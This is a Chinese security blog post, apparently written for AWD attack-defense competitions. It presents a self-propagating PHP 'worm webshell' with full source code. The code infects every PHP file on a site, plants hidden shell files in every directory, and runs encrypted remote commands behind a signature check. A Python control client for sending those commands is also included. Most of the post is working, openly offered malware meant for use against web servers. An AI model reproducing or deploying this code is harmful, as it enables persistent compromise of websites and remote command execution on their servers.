@@ -1,0 +1,196 @@
+原创： 3s_NWGeek 合天智汇
+
+原创投稿活动：[重金悬赏 |
+合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)
+
+0x00 蠕虫webshell
+
+不死马大家可能听得比较多，但蠕虫webshell大家可能还没有听过，因为是我为了awd比赛量身定制的一个webshell。
+
+蠕虫webshell之所以叫蠕虫webshell，是因为它可以把本地的php会写shell插入到其他php原文件，还增加了相互复活机制，后期增加与其他已感染的主机中的webshell互相复活。
+
+先给大家看看这个蠕虫webshell已经实现的功能:
+
+  1. 递归扫描所有web目录及文件，全部扫到的php写入webshell  
+
+  2. 网站全部php可作为webshell连接执行命令  
+
+  3. 不带参数请求又可以正常访问原页面，不影响访问  
+
+  4. 所有web路径目录写入单独一个特定webshell  
+
+  5. 判断是否写过不再重复写入  
+
+  6. 所有php页面都可以互相复活蠕虫webshell  
+
+  7. 蠕虫webshell返回所有php文件url地址  
+
+  8. 蠕虫webshell发送返回数据传输加密  
+
+  9. 数字签名校验执行、5秒后不可重放 后续添加  
+
+  10. 页面功能性可控（可以使全部php原有功能失效，只剩下webshell功能）  
+
+  11. 前端互相复活以及反渗透  
+
+  12. 适配meterpreter连接  
+
+  13. 加密混淆  
+
+简单来说最实际的功能还是，我带一个参数访问我的webshell，全站的php文件都被我感染，都可以当webshell连，都可以执行命令，只要带一个参数访问都可以互相复活。
+
+0x01 实际操作
+
+随着比赛规则越来越完善，不能提权root，php可能禁用越来越多的功能函数来保持比赛公平性，所以比赛时要先看看phpinfo有没有禁用我这个webshell其中的函数。
+
+当然比如说是扫描目录，比赛主办方可能禁用了scandir这个函数，所以我在马相关功能中只用了is_dir()这个函数。
+
+实际用例是这样的：
+
+假设shell.php已经上传到目录，上传目录为upload，ip为192.168.1.1
+
+  1. 访问 http://192.168.1.1/upload/shell.php 正常不带参数访问是返回状态码500，页面会正常访问  
+
+  2. 带参数下划线访问，会自动感染全站php文件，所有php可以当shell连接  
+
+  3. eg: http://192.168.1.1/upload/shell.php?_  
+
+  4. 如上带下划线参数访问后，右键查看页面源代码可以看到所有被感染的php地址。  
+
+  5. 可以使用python把所有url爬下来，爬取规则：checks_arr = html.find_all(attrs={'id': 'php_url'})  
+
+0x02 代码
+
+大致功能看完了，贴上源码详细注释来说一下。（后期我做了混淆和免杀
+
+  *   
+
+<?php $tips = 'AWD_Light_Check'; //这个是后面检查的是否感染头，如果没有，就会重写这个php
+error_reporting(0); $Serv_Num = 159;
+//这个变量是要写入其他文件头部的本页行数，因为感染了其他php要互相感染，不能把其他原有php代码写入到其他php，会乱套。 $arr_dir =
+array(); //全局变量，扫到的文件夹 $files = array(); //全局变量，扫到的文件 if
+(!function_exists('Url_Check')) { function Url_Check() { $pageURL = 'http'; if
+($_SERVER["HTTPS"] == "on") { $pageURL .= "s"; } $pageURL .= '://'; $pageURL
+.= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"]; return $pageURL; }
+function file_check($dir) { //扫描文件夹 global $arr_dir; global $files; if
+(is_dir($dir)) { if ($handle = opendir($dir)) { while (($file =
+readdir($handle)) !== false) { if ($file != '.' && $file != "..") { if
+(is_dir($dir . "/" . $file)) { $arr_dir[] = $dir; $files[$file] =
+file_check($dir . "/" . $file); //拼接文件 } else { $arr_dir[] = $dir; $files[] =
+$dir . "/" . $file; } } } } } closedir($handle); $arr_dir =
+array_unique($arr_dir); //去重 } function write_conf() { #每个目录创一个马 global
+$Serv_Num; global $arr_dir; foreach ($arr_dir as $dir_path) { // echo
+'<br>'.$dir_path; $srcode = ''; $localtext = file(__FILE__); for ($i = 0; $i <
+$Serv_Num; $i++) { $srcode .= $localtext[$i]; } //所有文件夹都生成一个webshell // echo
+"<span style='color:#666'></span> " . $dir_path . "/.Conf_check.php" .
+"<br/>"; $le = Url_Check(); echo '<iframe id="check_url">' . $le . '' .
+str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir_path . "/.Conf_check.php") .
+'</iframe>'; fputs(fopen($dir_path . "/.Conf_check.php", "w"), $srcode); } //
+当前目录所有php被感染 } function vul_tran() {
+//每个文件夹递归生成一个默认的马以及感染当前目录所有php文件。所谓感染就是把自身固定的代码插入到其他php文件中，甚至可以加注释符号或者退出函数exit()；控制其他页面的可用性。不过要注意一下，是当前目录，这样响应速度会快很多，亲测如果是一次性感染全部目录的php文件后续会引发py客户端响应超时及其他bug，所以改过来了。
+//###### global $Serv_Num; $pdir = dirname(__FILE__); //要获取的目录
+//先判断指定的路径是不是一个文件夹 if (is_dir($pdir)) { if ($dh = opendir($pdir)) { while
+(($fi = readdir($dh)) != false) { //文件名的全路径 包含文件名 $file_Path = $pdir . '/' .
+$fi; if (strpos($file_Path, '.php')) { //筛选当前目录.php后缀 $le = Url_Check();
+$file_Path = str_replace('\\\', '/', $file_Path); echo '<iframe
+id="check_url">' . $le . '' . str_replace($_SERVER['DOCUMENT_ROOT'], '',
+$file_Path) . '</iframe>'; $ftarget = file($file_Path); if
+(!strpos($ftarget[0], 'AWD_Light_Check')) { //检查头部是否传播 $scode = ''; $localtext
+= file(__FILE__); for ($i = 0; $i < $Serv_Num; $i++) { $scode .=
+$localtext[$i]; } $code_check = ''; $file_check = fopen($file_Path, "r");
+//复制要传播的文件代码，进行重写 while (!feof($file_check)) { $code_check .=
+fgets($file_check) . "\n"; } fclose($file_check); $webpage = fopen($file_Path,
+"w"); fwrite($webpage, $scode . $code_check); fclose($webpage); } } }
+closedir($dh); } } } }
+///////////////////////////////////////////////////////////////////////////////////
+//主函数 try { //定义特征才启动传播模式，特征值为_ if (isset($_GET['_'])) { $host = Url_Check();
+file_check($_SERVER['DOCUMENT_ROOT']); //全局扫描 write_conf(); //写入单文件
+vul_tran(); //感染当前目录 } elseif (isset($_GET['time']) && isset($_GET['salt']) &&
+isset($_GET['sign'])) { #客户端数字签名校验 $Check_key =
+'9c82746189f3d1815f1e6bfe259dac29'; $Check_api = $_GET['check']; $timestamp =
+$_GET['time']; $salt = $_GET['salt']; $csign = $_GET['sign']; $sign =
+md5($Check_api . $Check_key . $timestamp . $salt); if ($sign === $csign) {
+$nomal_test = ''; for ($i = 0; $i < strlen($Check_api); $i++) { $nomal_test .=
+chr(ord($Check_api[$i]) ^ $i % $salt); } $nomal_test =
+base64_decode($nomal_test); $nowtime = time(); if (abs($nowtime - $timestamp)
+<= 5) { $enc = base64_encode(rawurlencode(`{$nomal_test}`)); //解密并执行命令在加密返回
+$pieces = explode("i", $enc); $final = ""; foreach ($pieces as $val) { $final
+.= $val . "cAFAcABAAswTA2GE2c"; } $final = str_replace("=", ":kcehc_revres",
+$final); echo strrev(substr($final, 0, strlen($final) - 18)); exit; } else {
+header('HTTP/1.1 500 Internal Server Error'); } } else { header('HTTP/1.1 500
+Internal Server Error'); } } else { header('HTTP/1.1 500 Internal Server
+Error'); } } catch (Exception $e2) { }
+
+0x03 演示
+
+最后附上一个gif来演示一下，linux和windows的web服务器都可以兼容。Linux要注意下要有权限（awd比赛要做防护肯定有读写权限）
+
+演示视频是上一个版本的，所以 php传播参数是go，但功能演示都是一样的，就不重新录制了。
+
+图中的是 http://xx.x.xx.xx/webshell.php
+只要增加?go这个参数就可以把全部php给重新改写插入原来的webshell，只要跑着python脚本不断访问随机一个php，就能重复不断写入原webshell（有判断是否已经写入过，如果写入过就不会再重复写入），同时单独生成一个名字相同的webshell。
+
+![视频封面](https://pic2.zhimg.com/v2-b7381107b1a8586257f6b23d36624111.jpg)
+
+（需要视频，私信小编哦）
+
+​好的标题可以获得更多的推荐及关注者
+
+0x04 python控制
+
+对于python的命令执行端可以方便控制这个马。只要修改webshell_url和cmd执行的命令这两个参数就可以了。
+
+  *   
+
+#!/usr/bin/env python2.7 # -*- coding:utf-8 -*- from urllib import unquote
+import base64 import time from random import random from hashlib import md5
+import requests import traceback passwd = 'admin' webshell_url =
+'http://192.168.75.134/wuhen.php' cmd='ifconfig' def getSerTime(url):
+ser_time_format = '%a, %d %b %Y %H:%M:%S GMT' r = requests.get(url,
+allow_redirects=False) if r.headers['Date']: stimestrp =
+time.strptime(r.headers['Date'], ser_time_format) stime =
+time.mktime(stimestrp) + 60 * 60 * 8 # GMT + 8 时区 timeskew = int(time.time())
+- int(stime) return timeskew else: return None # 加密 def encrypt(string, salt,
+encoding='utf-8'): estring = '' b64string =
+base64.b64encode(string.encode(encoding)).decode('utf-8') for n, char in
+enumerate(b64string): estring += chr(ord(char) ^ n % salt) return estring # 解密
+def decrypt(estring, salt, encoding='utf-8'):
+data=estring[::-1].replace('cAFAcABAAswTA2GE2c','i').replace(':kcehc_revres','=').encode('unicode_escape').decode("string_escape")
+string=unquote(base64.urlsafe_b64decode(data)) string=unicode(string,
+"gb2312").encode("utf8")#windows有中文乱码去掉这个注释，linux去掉这行，不然会报错 return string #
+命令执行 def excmd(url, passwd, cmd, encoding='utf-8'): try: timeskew =
+getSerTime('/'.join(url.split('/')[:-1])) # 校对服务器时间，防止时间差造成API校验失败 nowtime =
+int(time.time()) if timeskew == None: print('检查服务器时间出错，请手动确认服务器时间！') #
+手动获取服务器时间戳，并保存到servtime变量中，int类型 # Linux下获取方法：date +%s servtime = 1540891350
+nowtime = servtime else: nowtime -= timeskew # 开始发起请求 passwd =
+md5(passwd.encode('utf-8')).hexdigest() salt = int(random() * 100) ecmd =
+encrypt(cmd, salt) sign_tmp = ecmd + passwd + str(nowtime) + str(salt) sign =
+md5(sign_tmp.encode('utf-8')).hexdigest() parameters = { 'time': nowtime,
+'check': ecmd, 'salt': salt, 'sign': sign } head = {'User-Agent': 'Mozilla/5.0
+(Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0', 'Accept':
+'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Cache-Control':
+'max-age=0'} r = requests.get(url, params=parameters, headers=head,timeout=3)
+# r = requests.post(url, data=parameters, headers=head, proxies={'http':
+'http://127.0.0.1:8080'}), if '0:' in r.text:print '执行成功：', res =
+decrypt(r.content.decode('utf-8').replace('0:',''), salt, encoding) return res
+except Exception as e: pass # print('参数配置错误，连接异常err:%s'%str(e))
+traceback.print_exc() def main(): r = excmd(webshell_url, passwd, cmd)
+print(r) if __name__ == '__main__': main()
+
+![视频封面](https://pic3.zhimg.com/v2-8b91e078d4ec34fc4af4e699004baa12.jpg)
+
+（需要视频，私信小编哦）
+
+​好的标题可以获得更多的推荐及关注者
+
+实际运行效果，随机挑选一个php地址进行命令执行。
+
+1.改好webshell地址 . 改执行命令 实际效果：. 加密传输的http流量 . 数字签名校验 . 5秒后不可重放 . 命令执行回显
+
+缺点与不足：有些比赛权限做得比较严，www-data权限无法更改属于ctf用户php文件，只能每个目录生成一个默认的蠕虫webshell互相复活，对于这个我会持续更新的，敬请期待！
+
+声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！
+
+  
+
